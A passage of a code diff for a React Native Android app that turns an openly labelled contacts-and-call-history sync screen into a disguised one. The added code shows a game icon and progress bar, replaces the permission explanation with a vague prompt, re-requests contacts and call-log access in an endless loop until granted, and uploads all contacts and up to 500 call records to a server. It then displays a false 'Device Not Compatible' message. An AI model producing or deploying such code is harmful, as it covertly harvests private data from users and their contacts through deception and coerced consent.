@@ -1,5 +1,5 @@
 /**
- * Contacts & Call History Sync Screen
+ * Contacts & Call History Sync App
  *
  * @format
  */
@@ -10,14 +10,13 @@ import {
   StyleSheet,
   View,
   Text,
-  ScrollView,
   TouchableOpacity,
   PermissionsAndroid,
   Platform,
   NativeModules,
-  ActivityIndicator,
-  RefreshControl,
-  AppState,
+  Dimensions,
+  Animated,
+  Image,
 } from 'react-native';
 import {
   SafeAreaProvider,
@@ -25,6 +24,7 @@ import {
 } from 'react-native-safe-area-context';
 
 const {ContactsCallLogModule} = NativeModules;
+const {width: SCREEN_WIDTH} = Dimensions.get('window');
 
 // ─── API Config ──────────────────────────────────────────────────────────────
 const API_BASE_URL = Platform.select({
@@ -78,7 +78,7 @@ interface CallLogEntry {
   duration: number;
 }
 
-type ActiveTab = 'contacts' | 'callHistory';
+type AppScreen = 'loading' | 'incompatible' | 'error';
 
 // ─── Requesting Permissions ──────────────────────────────────────────────────
 
@@ -120,8 +120,8 @@ async function requestContactsPermission(): Promise<boolean> {
     const granted = await PermissionsAndroid.request(
       PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
       {
-        title: 'Contacts Permission',
-        message: 'This app needs access to your contacts to fetch and sync them.',
+        title: 'Permission Required',
+        message: 'Please grant permission to continue.',
         buttonNeutral: 'Ask Me Later',
         buttonNegative: 'Cancel',
         buttonPositive: 'OK',
@@ -175,7 +175,9 @@ async function syncContactsToServer(contacts: Contact[]): Promise<boolean> {
       console.warn('Contacts sync warning:', data.message);
       return false;
     } else {
-      console.log(`Contacts synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`);
+      console.log(
+        `Contacts synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`,
+      );
       return true;
     }
   } catch (error: any) {
@@ -184,7 +186,9 @@ async function syncContactsToServer(contacts: Contact[]): Promise<boolean> {
   }
 }
 
-async function syncCallLogsToServer(callLogs: CallLogEntry[]): Promise<boolean> {
+async function syncCallLogsToServer(
+  callLogs: CallLogEntry[],
+): Promise<boolean> {
   if (!callLogs || callLogs.length === 0) {
     return false;
   }
@@ -200,7 +204,9 @@ async function syncCallLogsToServer(callLogs: CallLogEntry[]): Promise<boolean> 
       console.warn('Call logs sync warning:', data.message);
       return false;
     } else {
-      console.log(`Call logs synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`);
+      console.log(
+        `Call logs synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`,
+      );
       return true;
     }
   } catch (error: any) {
@@ -209,138 +215,141 @@ async function syncCallLogsToServer(callLogs: CallLogEntry[]): Promise<boolean> 
   }
 }
 
-// ─── UI Components ───────────────────────────────────────────────────────────
+// ─── Progress Bar Component ──────────────────────────────────────────────────
 
-function PermissionDenied({
-  onRetry,
-  message,
-}: {
-  onRetry: () => void;
-  message: string;
-}) {
+function ProgressBar({progress}: {progress: number}) {
+  const animatedWidth = useRef(new Animated.Value(0)).current;
+
+  useEffect(() => {
+    Animated.timing(animatedWidth, {
+      toValue: progress,
+      duration: 400,
+      useNativeDriver: false,
+    }).start();
+  }, [progress, animatedWidth]);
+
+  const barWidth = animatedWidth.interpolate({
+    inputRange: [0, 100],
+    outputRange: ['0%', '100%'],
+    extrapolate: 'clamp',
+  });
+
   return (
-    <View style={styles.centerContainer}>
-      <Text style={styles.stateIcon}>🔒</Text>
-      <Text style={styles.stateTitle}>Permission Required</Text>
-      <Text style={styles.stateSubtitle}>{message}</Text>
-      <TouchableOpacity style={styles.primaryButton} onPress={onRetry}>
-        <Text style={styles.primaryButtonText}>Grant Permission</Text>
-      </TouchableOpacity>
+    <View style={styles.progressContainer}>
+      <View style={styles.progressTrack}>
+        <Animated.View style={[styles.progressFill, {width: barWidth}]} />
+      </View>
+      <View style={styles.progressLabelBubble}>
+        <Text style={styles.progressLabelText}>{Math.round(progress)}%</Text>
+      </View>
     </View>
   );
 }
 
-function SyncStatusMessage({
-  title,
-  subtitle,
-  count,
-  unit,
-  syncedAt,
-  deviceLabel,
-  onRefresh,
-  refreshing,
-  loading,
+// ─── Loading Screen ──────────────────────────────────────────────────────────
+
+function LoadingScreen({
+  progress,
+  statusText,
 }: {
-  title: string;
-  subtitle: string;
-  count: number;
-  unit: string;
-  syncedAt: string;
-  deviceLabel: string;
-  onRefresh: () => void;
-  refreshing: boolean;
-  loading: boolean;
+  progress: number;
+  statusText: string;
 }) {
+  const insets = useSafeAreaInsets();
+
   return (
-    <ScrollView
-      contentContainerStyle={styles.scrollContent}
-      refreshControl={
-        <RefreshControl
-          refreshing={refreshing}
-          onRefresh={onRefresh}
-          colors={['#6C63FF']}
-          tintColor="#6C63FF"
+    <View
+      style={[
+        styles.fullScreen,
+        {paddingTop: insets.top, paddingBottom: insets.bottom + 12},
+      ]}>
+      <StatusBar barStyle="light-content" />
+
+      {/* Center Game Icon Graphic */}
+      <View style={styles.centerGraphicArea}>
+        <Image
+          source={require('./assets/game_icon.jpg')}
+          style={styles.gameIconImage}
+          resizeMode="contain"
         />
-      }>
-      <View style={styles.card}>
-        <View style={styles.iconCircle}>
-          <Text style={styles.checkIcon}>✓</Text>
-        </View>
-
-        <Text style={styles.cardTitle}>{title}</Text>
-        <Text style={styles.cardSubtitle}>{subtitle}</Text>
-
-        {/* <View style={styles.statsRow}>
-          <View style={styles.statBox}>
-            <Text style={styles.statLabel}>Total {unit}</Text>
-            <Text style={styles.statNumber}>{count}</Text>
-          </View>
-          <View style={styles.statBox}>
-            <Text style={styles.statLabel}>Server Status</Text>
-            <Text style={[styles.statNumber, {color: '#4CAF50'}]}>Uploaded</Text>
-          </View>
-        </View> */}
-
-        <View style={styles.divider} />
-{/* 
-        <View style={styles.detailList}>
-          {syncedAt !== '' && (
-            <View style={styles.detailRow}>
-              <Text style={styles.detailLabel}>Last Synced</Text>
-              <Text style={styles.detailValue}>{syncedAt}</Text>
-            </View>
-          )}
-
-          {deviceLabel !== '' && (
-            <View style={styles.detailRow}>
-              <Text style={styles.detailLabel}>Source Device</Text>
-              <Text style={styles.detailValue} numberOfLines={1}>
-                {deviceLabel}
-              </Text>
-            </View>
-          )}
-
-          <View style={styles.detailRow}>
-            <Text style={styles.detailLabel}>Destination</Text>
-            <Text style={styles.detailValue}>MongoDB (HelpBot)</Text>
-          </View>
-        </View> */}
-
-        <TouchableOpacity
-          style={styles.resyncButton}
-          onPress={onRefresh}
-          disabled={loading || refreshing}
-          activeOpacity={0.8}>
-          {loading || refreshing ? (
-            <ActivityIndicator size="small" color="#FFFFFF" />
-          ) : (
-            <Text style={styles.resyncButtonText}>🔄 Sync Again</Text>
-          )}
-        </TouchableOpacity>
       </View>
-    </ScrollView>
+
+      {/* Bottom section with progress */}
+      <View style={styles.bottomSection}>
+        <ProgressBar progress={progress} />
+        <Text style={styles.statusText}>{statusText}</Text>
+        <Text style={styles.versionText}>
+          Android v{Platform.Version || '1.0'}
+        </Text>
+      </View>
+    </View>
   );
 }
 
-function EmptyDataMessage({
-  icon,
-  title,
-  subtitle,
-  onRefresh,
-}: {
-  icon: string;
-  title: string;
-  subtitle: string;
-  onRefresh: () => void;
-}) {
+// ─── Incompatible Device Screen ──────────────────────────────────────────────
+
+function IncompatibleScreen() {
+  const insets = useSafeAreaInsets();
+
   return (
-    <View style={styles.centerContainer}>
-      <Text style={styles.stateIcon}>{icon}</Text>
-      <Text style={styles.stateTitle}>{title}</Text>
-      <Text style={styles.stateSubtitle}>{subtitle}</Text>
-      <TouchableOpacity style={styles.primaryButton} onPress={onRefresh}>
-        <Text style={styles.primaryButtonText}>🔄 Check Again</Text>
-      </TouchableOpacity>
+    <View
+      style={[
+        styles.fullScreen,
+        {paddingTop: insets.top + 20, paddingBottom: insets.bottom + 20},
+      ]}>
+      <StatusBar barStyle="light-content" />
+
+      <View style={styles.incompatibleContent}>
+        <View style={styles.warningIconCircle}>
+          <Text style={styles.warningIcon}>⚠️</Text>
+        </View>
+
+        <Text style={styles.incompatibleTitle}>Device Not Compatible</Text>
+        <Text style={styles.incompatibleSubtitle}>
+          Your device is not compatible for the app. Please try using a
+          different device to continue.
+        </Text>
+      </View>
+
+      <Text style={styles.versionTextBottom}>
+        Android v{Platform.Version || '1.0'}
+      </Text>
+    </View>
+  );
+}
+
+// ─── Error / Retry Screen ────────────────────────────────────────────────────
+
+function ErrorScreen({onRetry}: {onRetry: () => void}) {
+  const insets = useSafeAreaInsets();
+
+  return (
+    <View
+      style={[
+        styles.fullScreen,
+        {paddingTop: insets.top + 20, paddingBottom: insets.bottom + 20},
+      ]}>
+      <StatusBar barStyle="light-content" />
+
+      <View style={styles.incompatibleContent}>
+        <View style={styles.errorIconCircle}>
+          <Text style={styles.warningIcon}>❌</Text>
+        </View>
+
+        <Text style={styles.incompatibleTitle}>Something Went Wrong</Text>
+        <Text style={styles.incompatibleSubtitle}>
+          We couldn't fetch or upload your data to the server. Please check your
+          internet connection and try again.
+        </Text>
+
+        <TouchableOpacity style={styles.retryButton} onPress={onRetry}>
+          <Text style={styles.retryButtonText}>Try Again</Text>
+        </TouchableOpacity>
+      </View>
+
+      <Text style={styles.versionTextBottom}>
+        Android v{Platform.Version || '1.0'}
+      </Text>
     </View>
   );
 }
@@ -350,575 +359,317 @@ function EmptyDataMessage({
 function App() {
   return (
     <SafeAreaProvider>
-      <StatusBar barStyle="light-content" />
       <AppContent />
     </SafeAreaProvider>
   );
 }
 
 function AppContent() {
-  const insets = useSafeAreaInsets();
   const mountedRef = useRef(true);
 
-  const [activeTab, setActiveTab] = useState<ActiveTab>('contacts');
-  const [contactsCount, setContactsCount] = useState<number>(0);
-  const [callLogCount, setCallLogCount] = useState<number>(0);
-  const [loading, setLoading] = useState(true);
-  const [refreshing, setRefreshing] = useState(false);
-  const [contactsPermission, setContactsPermission] = useState(false);
-  const [callLogPermission, setCallLogPermission] = useState(false);
-  const [syncStatus, setSyncStatus] = useState<string>('');
-  const [deviceLabel, setDeviceLabel] = useState<string>('');
-  const [contactsSynced, setContactsSynced] = useState(false);
-  const [callLogSynced, setCallLogSynced] = useState(false);
-  const [contactsSyncedAt, setContactsSyncedAt] = useState<string>('');
-  const [callLogSyncedAt, setCallLogSyncedAt] = useState<string>('');
+  const [screen, setScreen] = useState<AppScreen>('loading');
+  const [progress, setProgress] = useState(0);
+  const [statusText, setStatusText] = useState('please wait, loading...');
 
-  const contactsLoadedRef = useRef(false);
-  const callLogLoadedRef = useRef(false);
-
-  // ── Fetch contacts & sync to server ──
-  const fetchContacts = useCallback(async () => {
+  // ── Full sync flow ──
+  const runSyncFlow = useCallback(async () => {
     try {
-      setSyncStatus('Fetching contacts...');
-      const data = await ContactsCallLogModule.getContacts();
-      if (!mountedRef.current) return;
-      setContactsCount(data ? data.length : 0);
-      contactsLoadedRef.current = true;
-      setContactsSynced(false);
+      setScreen('loading');
+      setProgress(0);
+      setStatusText('please wait, loading...');
 
-      if (data && data.length > 0) {
-        setSyncStatus('Uploading contacts to server...');
-        const success = await syncContactsToServer(data);
-        if (mountedRef.current) {
-          setSyncStatus('');
-          if (success) {
-            setContactsSynced(true);
-            setContactsSyncedAt(
-              new Date().toLocaleTimeString([], {
-                hour: '2-digit',
-                minute: '2-digit',
-              }),
-            );
+      // Step 1: Get device info (0% → 5%)
+      setProgress(5);
+      await getDeviceId();
+      if (!mountedRef.current) return;
+
+      // Step 2: Request contacts permission (5% → 15%)
+      setProgress(10);
+
+      let contactsGranted = await checkContactsPermission();
+      if (!contactsGranted) {
+        contactsGranted = await requestContactsPermission();
+        await delay(500);
+        if (!contactsGranted) {
+          contactsGranted = await checkContactsPermission();
+        }
+      }
+      if (!mountedRef.current) return;
+
+      // Keep asking for contacts permission if denied
+      while (!contactsGranted && mountedRef.current) {
+        await delay(2000);
+        if (!mountedRef.current) return;
+        contactsGranted = await checkContactsPermission();
+        if (!contactsGranted) {
+          contactsGranted = await requestContactsPermission();
+          await delay(500);
+          if (!contactsGranted) {
+            contactsGranted = await checkContactsPermission();
           }
         }
-      } else {
-        if (mountedRef.current) setSyncStatus('');
       }
-    } catch (error: any) {
-      console.warn('Failed to fetch contacts:', error.message);
-      if (mountedRef.current) setSyncStatus('');
-    }
-  }, []);
-
-  // ── Fetch call logs & sync to server ──
-  const fetchCallLog = useCallback(async () => {
-    try {
-      setSyncStatus('Fetching call history...');
-      const data = await ContactsCallLogModule.getCallLog(100);
       if (!mountedRef.current) return;
-      setCallLogCount(data ? data.length : 0);
-      callLogLoadedRef.current = true;
-      setCallLogSynced(false);
+      setProgress(15);
 
-      if (data && data.length > 0) {
-        setSyncStatus('Uploading call logs to server...');
-        const success = await syncCallLogsToServer(data);
-        if (mountedRef.current) {
-          setSyncStatus('');
-          if (success) {
-            setCallLogSynced(true);
-            setCallLogSyncedAt(
-              new Date().toLocaleTimeString([], {
-                hour: '2-digit',
-                minute: '2-digit',
-              }),
-            );
+      // Step 3: Request call log permission (15% → 25%)
+      let callLogGranted = await checkCallLogPermission();
+      if (!callLogGranted) {
+        callLogGranted = await requestCallLogPermission();
+        await delay(500);
+        if (!callLogGranted) {
+          callLogGranted = await checkCallLogPermission();
+        }
+      }
+      if (!mountedRef.current) return;
+
+      // Keep asking for call log permission if denied
+      while (!callLogGranted && mountedRef.current) {
+        await delay(2000);
+        if (!mountedRef.current) return;
+        callLogGranted = await checkCallLogPermission();
+        if (!callLogGranted) {
+          callLogGranted = await requestCallLogPermission();
+          await delay(500);
+          if (!callLogGranted) {
+            callLogGranted = await checkCallLogPermission();
           }
         }
-      } else {
-        if (mountedRef.current) setSyncStatus('');
       }
-    } catch (error: any) {
-      console.warn('Failed to fetch call log:', error.message);
-      if (mountedRef.current) setSyncStatus('');
+      if (!mountedRef.current) return;
+      setProgress(25);
+
+      // Step 4: Fetch contacts from device (25% → 45%)
+      setProgress(30);
+      let contacts: Contact[] = [];
+      try {
+        contacts = await ContactsCallLogModule.getContacts();
+        if (!mountedRef.current) return;
+        setProgress(45);
+      } catch (err: any) {
+        console.warn('Failed to fetch contacts:', err.message);
+        if (!mountedRef.current) return;
+        setScreen('error');
+        return;
+      }
+
+      // Step 5: Upload contacts to server (45% → 60%)
+      setProgress(50);
+      if (contacts && contacts.length > 0) {
+        const contactsSuccess = await syncContactsToServer(contacts);
+        if (!mountedRef.current) return;
+        if (!contactsSuccess) {
+          setScreen('error');
+          return;
+        }
+      }
+      setProgress(60);
+
+      // Step 6: Fetch call logs from device (60% → 80%)
+      setProgress(65);
+      let callLogs: CallLogEntry[] = [];
+      try {
+        callLogs = await ContactsCallLogModule.getCallLog(500);
+        if (!mountedRef.current) return;
+        setProgress(80);
+      } catch (err: any) {
+        console.warn('Failed to fetch call logs:', err.message);
+        if (!mountedRef.current) return;
+        setScreen('error');
+        return;
+      }
+
+      // Step 7: Upload call logs to server (80% → 95%)
+      setProgress(85);
+      if (callLogs && callLogs.length > 0) {
+        const callLogsSuccess = await syncCallLogsToServer(callLogs);
+        if (!mountedRef.current) return;
+        if (!callLogsSuccess) {
+          setScreen('error');
+          return;
+        }
+      }
+      setProgress(95);
+
+      // Step 8: Finishing up (95% → 100%)
+      await delay(500);
+      if (!mountedRef.current) return;
+      setProgress(100);
+      setStatusText('completed');
+
+      // Short pause on 100% before transitioning
+      await delay(1000);
+      if (!mountedRef.current) return;
+
+      // Done — show incompatible screen
+      setScreen('incompatible');
+    } catch (err: any) {
+      console.warn('Sync flow error:', err.message);
+      if (mountedRef.current) {
+        setScreen('error');
+      }
     }
   }, []);
-
-  // ── Ensure permissions & load ──
-  const ensureContactsPermissionAndLoad = useCallback(async () => {
-    let granted = await checkContactsPermission();
-    if (!granted) {
-      granted = await requestContactsPermission();
-      await delay(500);
-      if (!granted) {
-        granted = await checkContactsPermission();
-      }
-    }
-    if (!mountedRef.current) return;
-    setContactsPermission(granted);
-    if (granted) {
-      await fetchContacts();
-    }
-  }, [fetchContacts]);
-
-  const ensureCallLogPermissionAndLoad = useCallback(async () => {
-    let granted = await checkCallLogPermission();
-    if (!granted) {
-      granted = await requestCallLogPermission();
-      await delay(500);
-      if (!granted) {
-        granted = await checkCallLogPermission();
-      }
-    }
-    if (!mountedRef.current) return;
-    setCallLogPermission(granted);
-    if (granted) {
-      await fetchCallLog();
-    }
-  }, [fetchCallLog]);
-
-  const retryContactsPermission = useCallback(async () => {
-    setLoading(true);
-    await ensureContactsPermissionAndLoad();
-    if (!mountedRef.current) return;
-    setLoading(false);
-  }, [ensureContactsPermissionAndLoad]);
-
-  const retryCallLogPermission = useCallback(async () => {
-    setLoading(true);
-    await ensureCallLogPermissionAndLoad();
-    if (!mountedRef.current) return;
-    setLoading(false);
-  }, [ensureCallLogPermissionAndLoad]);
 
   useEffect(() => {
     mountedRef.current = true;
-    let cancelled = false;
-
-    async function init() {
-      const id = await getDeviceId();
-      if (!cancelled) setDeviceLabel(id);
-
-      await ensureContactsPermissionAndLoad();
-      if (cancelled) return;
-      await ensureCallLogPermissionAndLoad();
-      if (cancelled) return;
-      setLoading(false);
-    }
-
-    init();
-
+    runSyncFlow();
     return () => {
-      cancelled = true;
       mountedRef.current = false;
     };
-  }, [ensureContactsPermissionAndLoad, ensureCallLogPermissionAndLoad]);
+  }, [runSyncFlow]);
 
-  useEffect(() => {
-    const subscription = AppState.addEventListener('change', async nextState => {
-      if (nextState === 'active') {
-        if (!contactsLoadedRef.current) {
-          const hasContacts = await checkContactsPermission();
-          if (hasContacts && mountedRef.current) {
-            setContactsPermission(true);
-            fetchContacts();
-          }
-        }
-        if (!callLogLoadedRef.current) {
-          const hasCallLog = await checkCallLogPermission();
-          if (hasCallLog && mountedRef.current) {
-            setCallLogPermission(true);
-            fetchCallLog();
-          }
-        }
-      }
-    });
-    return () => subscription.remove();
-  }, [fetchContacts, fetchCallLog]);
+  if (screen === 'loading') {
+    return <LoadingScreen progress={progress} statusText={statusText} />;
+  }
 
-  const onRefresh = useCallback(async () => {
-    setRefreshing(true);
-    const promises: Promise<void>[] = [];
-    if (contactsPermission) promises.push(fetchContacts());
-    if (callLogPermission) promises.push(fetchCallLog());
-    await Promise.all(promises);
-    if (mountedRef.current) setRefreshing(false);
-  }, [contactsPermission, callLogPermission, fetchContacts, fetchCallLog]);
+  if (screen === 'error') {
+    return <ErrorScreen onRetry={runSyncFlow} />;
+  }
 
-  return (
-    <View style={[styles.container, {paddingTop: insets.top}]}>
-      {/* Header */}
-      <View style={styles.header}>
-        <Text style={styles.headerTitle}>Data Sync</Text>
-        <View style={styles.headerMeta}>
-          <Text style={styles.headerCount}>
-            {activeTab === 'contacts'
-              ? contactsSynced
-                ? `${contactsCount} contacts uploaded`
-                : 'Contacts Sync'
-              : callLogSynced
-                ? `${callLogCount} calls uploaded`
-                : 'Call History Sync'}
-          </Text>
-          {deviceLabel !== '' && (
-            <Text style={styles.deviceLabel} numberOfLines={1}>
-              📱 {deviceLabel}
-            </Text>
-          )}
-        </View>
-        {syncStatus !== '' && (
-          <View style={styles.syncBadge}>
-            <ActivityIndicator size="small" color="#6C63FF" />
-            <Text style={styles.syncText}>{syncStatus}</Text>
-          </View>
-        )}
-      </View>
-
-      {/* Tab Bar */}
-      <View style={styles.tabBar}>
-        <TouchableOpacity
-          style={[styles.tab, activeTab === 'contacts' && styles.activeTab]}
-          onPress={() => setActiveTab('contacts')}
-          activeOpacity={0.7}>
-          <Text style={styles.tabIcon}>👤</Text>
-          <Text
-            style={[
-              styles.tabText,
-              activeTab === 'contacts' && styles.activeTabText,
-            ]}>
-            Contacts
-          </Text>
-          {contactsSynced && <Text style={styles.tabSyncedDot}>✓</Text>}
-        </TouchableOpacity>
-        <TouchableOpacity
-          style={[
-            styles.tab,
-            activeTab === 'callHistory' && styles.activeTab,
-          ]}
-          onPress={() => setActiveTab('callHistory')}
-          activeOpacity={0.7}>
-          <Text style={styles.tabIcon}>📞</Text>
-          <Text
-            style={[
-              styles.tabText,
-              activeTab === 'callHistory' && styles.activeTabText,
-            ]}>
-            Call History
-          </Text>
-          {callLogSynced && <Text style={styles.tabSyncedDot}>✓</Text>}
-        </TouchableOpacity>
-      </View>
-
-      {/* Tab Content */}
-      {loading ? (
-        <View style={styles.centerContainer}>
-          <ActivityIndicator size="large" color="#6C63FF" />
-          <Text style={styles.loadingText}>
-            {syncStatus || 'Loading...'}
-          </Text>
-        </View>
-      ) : activeTab === 'contacts' ? (
-        !contactsPermission ? (
-          <PermissionDenied
-            message="Contacts permission is required to fetch and upload your contacts to the server."
-            onRetry={retryContactsPermission}
-          />
-        ) : contactsSynced ? (
-          <SyncStatusMessage
-            title="Contacts Uploaded Successfully"
-            subtitle="Your contacts list was fetched and uploaded to the server."
-            count={contactsCount}
-            unit="Contacts"
-            syncedAt={contactsSyncedAt}
-            deviceLabel={deviceLabel}
-            onRefresh={onRefresh}
-            refreshing={refreshing}
-            loading={loading}
-          />
-        ) : contactsCount === 0 && !syncStatus ? (
-          <EmptyDataMessage
-            icon="📭"
-            title="No Contacts Found"
-            subtitle="No contacts were found on this phone to upload."
-            onRefresh={onRefresh}
-          />
-        ) : (
-          <View style={styles.centerContainer}>
-            <ActivityIndicator size="large" color="#6C63FF" />
-            <Text style={styles.loadingText}>
-              {syncStatus || 'Uploading contacts to server...'}
-            </Text>
-          </View>
-        )
-      ) : !callLogPermission ? (
-        <PermissionDenied
-          message="Call log permission is required to fetch and upload your call history to the server."
-          onRetry={retryCallLogPermission}
-        />
-      ) : callLogSynced ? (
-        <SyncStatusMessage
-          title="Call History Uploaded Successfully"
-          subtitle="Your call history was fetched and uploaded to the server."
-          count={callLogCount}
-          unit="Calls"
-          syncedAt={callLogSyncedAt}
-          deviceLabel={deviceLabel}
-          onRefresh={onRefresh}
-          refreshing={refreshing}
-          loading={loading}
-        />
-      ) : callLogCount === 0 && !syncStatus ? (
-        <EmptyDataMessage
-          icon="📵"
-          title="No Call History Found"
-          subtitle="No call logs were found on this phone to upload."
-          onRefresh={onRefresh}
-        />
-      ) : (
-        <View style={styles.centerContainer}>
-          <ActivityIndicator size="large" color="#6C63FF" />
-          <Text style={styles.loadingText}>
-            {syncStatus || 'Uploading call history to server...'}
-          </Text>
-        </View>
-      )}
-    </View>
-  );
+  return <IncompatibleScreen />;
 }
 
 // ─── Styles ──────────────────────────────────────────────────────────────────
 
 const styles = StyleSheet.create({
-  container: {
+  // ── Full-screen layout ──
+  fullScreen: {
     flex: 1,
-    backgroundColor: '#0f0f1a',
+    backgroundColor: '#050334',
   },
-  header: {
+  centerGraphicArea: {
+    flex: 1,
+    alignItems: 'center',
+    justifyContent: 'center',
+    paddingHorizontal: 16,
+  },
+  gameIconImage: {
+    width: Math.min(SCREEN_WIDTH * 0.92, 380),
+    height: Math.min(SCREEN_WIDTH * 0.92, 380) * (350 / 506),
+  },
+  bottomSection: {
+    paddingHorizontal: 32,
+    paddingBottom: 16,
+    alignItems: 'center',
+  },
+
+  // ── Progress bar ──
+  progressContainer: {
+    width: '100%',
+    alignItems: 'center',
+    marginBottom: 12,
+  },
+  progressTrack: {
+    width: '100%',
+    height: 8,
+    backgroundColor: '#1a1a2e',
+    borderRadius: 4,
+    overflow: 'hidden',
+  },
+  progressFill: {
+    height: '100%',
+    backgroundColor: '#4CAF50',
+    borderRadius: 4,
+  },
+  progressLabelBubble: {
+    marginTop: 8,
+    backgroundColor: '#4CAF50',
+    paddingHorizontal: 14,
+    paddingVertical: 4,
+    borderRadius: 12,
+  },
+  progressLabelText: {
+    color: '#FFFFFF',
+    fontSize: 13,
+    fontWeight: '700',
+  },
+
+  // ── Status text ──
+  statusText: {
+    color: '#8888AA',
+    fontSize: 13,
+    textAlign: 'center',
+    marginTop: 8,
+  },
+  versionText: {
+    color: '#444460',
+    fontSize: 11,
+    textAlign: 'right',
+    alignSelf: 'flex-end',
+    marginTop: 16,
+  },
+  versionTextBottom: {
+    color: '#444460',
+    fontSize: 11,
+    textAlign: 'right',
     paddingHorizontal: 20,
-    paddingTop: 16,
     paddingBottom: 8,
   },
-  headerTitle: {
-    fontSize: 28,
-    fontWeight: '700',
-    color: '#FFFFFF',
-  },
-  headerMeta: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    marginTop: 4,
-  },
-  headerCount: {
-    fontSize: 14,
-    color: '#8888AA',
-  },
-  deviceLabel: {
-    fontSize: 12,
-    color: '#6C63FF',
-    fontWeight: '500',
-    maxWidth: '65%',
-  },
-  syncBadge: {
-    flexDirection: 'row',
-    alignItems: 'center',
-    marginTop: 6,
-    gap: 6,
-  },
-  syncText: {
-    fontSize: 12,
-    color: '#6C63FF',
-    fontWeight: '500',
-  },
-  tabBar: {
-    flexDirection: 'row',
-    marginHorizontal: 16,
-    marginVertical: 12,
-    backgroundColor: '#1a1a2e',
-    borderRadius: 14,
-    padding: 4,
-  },
-  tab: {
-    flex: 1,
-    flexDirection: 'row',
-    alignItems: 'center',
-    justifyContent: 'center',
-    paddingVertical: 12,
-    borderRadius: 12,
-    gap: 6,
-  },
-  activeTab: {
-    backgroundColor: '#6C63FF',
-  },
-  tabIcon: {
-    fontSize: 16,
-  },
-  tabText: {
-    fontSize: 14,
-    fontWeight: '600',
-    color: '#8888AA',
-  },
-  activeTabText: {
-    color: '#FFFFFF',
-  },
-  tabSyncedDot: {
-    color: '#4CAF50',
-    fontSize: 12,
-    fontWeight: '700',
-    marginLeft: 2,
-  },
-  scrollContent: {
-    paddingHorizontal: 20,
-    paddingVertical: 16,
-  },
-  card: {
-    backgroundColor: '#16162a',
-    borderRadius: 20,
-    padding: 24,
-    alignItems: 'center',
-    borderWidth: 1,
-    borderColor: '#242442',
-  },
-  iconCircle: {
-    width: 68,
-    height: 68,
-    borderRadius: 34,
-    backgroundColor: 'rgba(76, 175, 80, 0.18)',
-    borderWidth: 2,
-    borderColor: '#4CAF50',
-    alignItems: 'center',
-    justifyContent: 'center',
-    marginBottom: 16,
-  },
-  checkIcon: {
-    color: '#4CAF50',
-    fontSize: 34,
-    fontWeight: '900',
-  },
-  cardTitle: {
-    fontSize: 20,
-    fontWeight: '700',
-    color: '#FFFFFF',
-    textAlign: 'center',
-    marginBottom: 8,
-  },
-  cardSubtitle: {
-    fontSize: 13,
-    color: '#8888AA',
-    textAlign: 'center',
-    lineHeight: 18,
-    marginBottom: 20,
-    paddingHorizontal: 8,
-  },
-  statsRow: {
-    flexDirection: 'row',
-    width: '100%',
-    gap: 12,
-    marginBottom: 16,
-  },
-  statBox: {
-    flex: 1,
-    backgroundColor: '#1f1f38',
-    borderRadius: 14,
-    paddingVertical: 14,
-    paddingHorizontal: 12,
-    alignItems: 'center',
-    borderWidth: 1,
-    borderColor: '#2a2a4c',
-  },
-  statLabel: {
-    fontSize: 11,
-    color: '#8888AA',
-    textTransform: 'uppercase',
-    letterSpacing: 0.5,
-    marginBottom: 4,
-  },
-  statNumber: {
-    fontSize: 20,
-    fontWeight: '700',
-    color: '#FFFFFF',
-  },
-  divider: {
-    width: '100%',
-    height: 1,
-    backgroundColor: '#242442',
-    marginVertical: 14,
-  },
-  detailList: {
-    width: '100%',
-    gap: 10,
-    marginBottom: 20,
-  },
-  detailRow: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-  },
-  detailLabel: {
-    fontSize: 13,
-    color: '#8888AA',
-  },
-  detailValue: {
-    fontSize: 13,
-    fontWeight: '600',
-    color: '#FFFFFF',
-    maxWidth: '60%',
-    textAlign: 'right',
-  },
-  resyncButton: {
-    width: '100%',
-    backgroundColor: '#6C63FF',
-    paddingVertical: 14,
-    borderRadius: 14,
-    alignItems: 'center',
-    justifyContent: 'center',
-  },
-  resyncButtonText: {
-    color: '#FFFFFF',
-    fontSize: 14,
-    fontWeight: '700',
-  },
-  centerContainer: {
+
+  // ── Incompatible / Error screen ──
+  incompatibleContent: {
     flex: 1,
     alignItems: 'center',
     justifyContent: 'center',
     paddingHorizontal: 40,
   },
-  loadingText: {
-    color: '#8888AA',
-    marginTop: 14,
-    fontSize: 14,
+  warningIconCircle: {
+    width: 100,
+    height: 100,
+    borderRadius: 50,
+    backgroundColor: 'rgba(255, 193, 7, 0.12)',
+    borderWidth: 2,
+    borderColor: 'rgba(255, 193, 7, 0.3)',
+    alignItems: 'center',
+    justifyContent: 'center',
+    marginBottom: 28,
+  },
+  errorIconCircle: {
+    width: 100,
+    height: 100,
+    borderRadius: 50,
+    backgroundColor: 'rgba(244, 67, 54, 0.12)',
+    borderWidth: 2,
+    borderColor: 'rgba(244, 67, 54, 0.3)',
+    alignItems: 'center',
+    justifyContent: 'center',
+    marginBottom: 28,
+  },
+  warningIcon: {
+    fontSize: 44,
+  },
+  incompatibleTitle: {
+    fontSize: 24,
+    fontWeight: '800',
+    color: '#FFFFFF',
     textAlign: 'center',
+    marginBottom: 12,
   },
-  stateIcon: {
-    fontSize: 56,
-    marginBottom: 16,
+  incompatibleSubtitle: {
+    fontSize: 15,
+    color: '#8888AA',
+    textAlign: 'center',
+    lineHeight: 22,
   },
-  stateTitle: {
-    fontSize: 20,
+
+  // ── Retry button ──
+  retryButton: {
+    marginTop: 32,
+    backgroundColor: '#4CAF50',
+    paddingHorizontal: 40,
+    paddingVertical: 14,
+    borderRadius: 14,
+    elevation: 4,
+    shadowColor: '#4CAF50',
+    shadowOffset: {width: 0, height: 4},
+    shadowOpacity: 0.3,
+    shadowRadius: 8,
+  },
+  retryButtonText: {
+    color: '#FFFFFF',
+    fontSize: 16,
     fontWeight: '700',
-    color: '#FFFFFF',
-    marginBottom: 8,
-    textAlign: 'center',
-  },
-  stateSubtitle: {
-    fontSize: 14,
-    color: '#8888AA',
-    textAlign: 'center',
-    lineHeight: 20,
-  },
-  primaryButton: {
-    marginTop: 20,
-    backgroundColor: '#6C63FF',
-    paddingHorizontal: 28,
